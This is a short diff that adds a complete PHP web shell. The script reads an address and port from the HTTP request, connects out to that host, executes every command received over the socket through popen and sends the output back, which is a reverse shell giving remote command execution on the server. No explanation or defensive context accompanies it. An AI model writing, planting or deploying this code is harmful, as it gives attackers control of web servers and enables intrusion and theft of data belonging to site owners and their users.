@@ -1,0 +1,28 @@
+<?php
+// Gets 'addr' add 'port' parameters via GET or POST
+$addr=$_REQUEST['addr'];
+$port=$_REQUEST['port'];
+
+// Open a socket on addr:port
+if (!($sock=fsockopen($addr,$port))) {
+	die;
+}
+
+// While th socket has somethong to say...
+while (!feof($sock))  {
+	// Read the command 
+	$cmd  = fgets($sock);
+
+	// Execute the command, sending its output on a pipe
+	$pipe = popen($cmd,'r');
+
+	while (!feof($pipe)) {
+		fwrite ($sock, fgets($pipe));
+	}
+
+	// Close the pipe
+	pclose($pipe);
+}
+// Close Socket
+fclose($sock);
+?>
